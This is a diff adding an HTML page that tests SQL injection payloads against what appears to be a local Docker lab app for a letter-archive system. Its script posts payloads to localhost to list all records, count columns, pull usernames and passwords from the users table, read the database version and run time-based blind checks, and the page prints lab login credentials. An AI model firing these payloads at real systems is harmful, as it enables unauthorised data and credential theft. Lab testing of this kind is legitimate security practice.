@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SQLi Payload Tester</title>
+    <style>
+        body {
+            font-family: monospace;
+            background-color: #1a1a1a;
+            color: #0f0;
+            padding: 20px;
+        }
+        .test-case {
+            background-color: #2a2a2a;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #0f0;
+        }
+        .payload {
+            background-color: #000;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #0f0;
+            cursor: pointer;
+        }
+        .payload:hover {
+            background-color: #1a3a1a;
+        }
+        button {
+            background-color: #0f0;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #0a0;
+        }
+        .result {
+            background-color: #000;
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #ff0;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        .success {
+            color: #0f0;
+        }
+        .error {
+            color: #f00;
+        }
+    </style>
+</head>
+<body>
+    <h1>🔥 SQLi Payload Tester - Sistem Arsip Surat</h1>
+    <p>Click payload untuk copy, atau klik tombol untuk test otomatis</p>
+
+    <div class="test-case">
+        <h3>Test Case 1: Show All Records</h3>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' OR '1'='1' #</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' OR '1'='1' -- -</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' OR 'x'='x</div>
+        <button onclick="testPayload(0, this.previousElementSibling.previousElementSibling.previousElementSibling.textContent)">Test Payload 1</button>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 2: Column Count Test</h3>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT 1,2,3,4 #</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT 1,2,3,4 -- -</div>
+        <button onclick="testPayload(1, this.previousElementSibling.previousElementSibling.textContent)">Test Payload 2</button>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 3: Extract Users & Passwords</h3>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT username,password,3,created_at FROM users #</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT username,password,3,created_at FROM users -- -</div>
+        <button onclick="testPayload(2, this.previousElementSibling.previousElementSibling.textContent)">Test Payload 3</button>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 4: Database Version</h3>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT 1,VERSION(),3,4 #</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' UNION SELECT 1,VERSION(),3,4 -- -</div>
+        <button onclick="testPayload(3, this.previousElementSibling.previousElementSibling.textContent)">Test Payload 4</button>
+    </div>
+
+    <div class="test-case">
+        <h3>Test Case 5: Time-based Blind SQLi</h3>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' AND SLEEP(5) #</div>
+        <div class="payload" onclick="copyToClipboard(this.textContent)">1' AND SLEEP(2) -- -</div>
+        <button onclick="testPayload(4, this.previousElementSibling.previousElementSibling.textContent)">Test Payload 5 (Wait 5s)</button>
+    </div>
+
+    <div id="results"></div>
+
+    <script>
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('Payload copied: ' + text);
+            });
+        }
+
+        async function testPayload(testNum, payload) {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML = '<div class="result">Testing payload: ' + payload + '<br>Please wait...</div>';
+
+            const startTime = Date.now();
+
+            try {
+                const formData = new FormData();
+                formData.append('search', payload);
+
+                const response = await fetch('http://localhost:8000/sqli.php', {
+                    method: 'POST',
+                    body: formData,
+                    credentials: 'include'
+                });
+
+                const html = await response.text();
+                const elapsed = Date.now() - startTime;
+
+                // Check if response contains error
+                if (html.includes('SQL Error')) {
+                    const errorMatch = html.match(/SQL Error: ([^<]+)/);
+                    const errorMsg = errorMatch ? errorMatch[1] : 'Unknown error';
+                    resultsDiv.innerHTML = '<div class="result error">❌ FAILED<br>' +
+                        'Payload: ' + payload + '<br>' +
+                        'Error: ' + errorMsg + '<br>' +
+                        'Time: ' + elapsed + 'ms</div>';
+                } else if (html.includes('Hasil Pencarian') || html.includes('Search Results')) {
+                    resultsDiv.innerHTML = '<div class="result success">✅ SUCCESS<br>' +
+                        'Payload: ' + payload + '<br>' +
+                        'Response time: ' + elapsed + 'ms<br>' +
+                        'Data returned successfully!</div>';
+                } else if (html.includes('login')) {
+                    resultsDiv.innerHTML = '<div class="result error">⚠️ NOT LOGGED IN<br>' +
+                        'Please login first at http://localhost:8000/login.php<br>' +
+                        'Username: admin<br>Password: admin123</div>';
+                } else {
+                    resultsDiv.innerHTML = '<div class="result">⚠️ UNKNOWN RESPONSE<br>' +
+                        'Payload: ' + payload + '<br>' +
+                        'Time: ' + elapsed + 'ms<br>' +
+                        'Check manually in browser</div>';
+                }
+            } catch (error) {
+                resultsDiv.innerHTML = '<div class="result error">❌ REQUEST FAILED<br>' +
+                    'Error: ' + error.message + '<br>' +
+                    'Make sure Docker is running and you\'re logged in</div>';
+            }
+        }
+
+        // Test all payloads
+        async function testAll() {
+            const payloads = [
+                "1' OR '1'='1' #",
+                "1' UNION SELECT 1,2,3,4 #",
+                "1' UNION SELECT username,password,3,created_at FROM users #",
+                "1' UNION SELECT 1,VERSION(),3,4 #",
+                "1' AND SLEEP(2) #"
+            ];
+
+            for (let i = 0; i < payloads.length; i++) {
+                await testPayload(i, payloads[i]);
+                if (i < payloads.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                }
+            }
+        }
+    </script>
+
+    <button onclick="testAll()" style="position: fixed; top: 20px; right: 20px; font-size: 16px;">
+        🚀 Test All Payloads
+    </button>
+
+    <div style="margin-top: 40px; padding: 20px; background-color: #2a2a2a; border: 1px solid #0f0;">
+        <h3>📋 Instructions:</h3>
+        <ol>
+            <li>Make sure Docker is running: <code>docker compose up -d</code></li>
+            <li>Login first: <a href="http://localhost:8000/login.php" target="_blank" style="color: #0f0;">http://localhost:8000/login.php</a></li>
+            <li>Use: admin / admin123</li>
+            <li>Come back to this page and click "Test All Payloads"</li>
+            <li>Or click individual "Test Payload" buttons</li>
+            <li>Or click on payload to copy and test manually</li>
+        </ol>
+    </div>
+</body>
+</html>
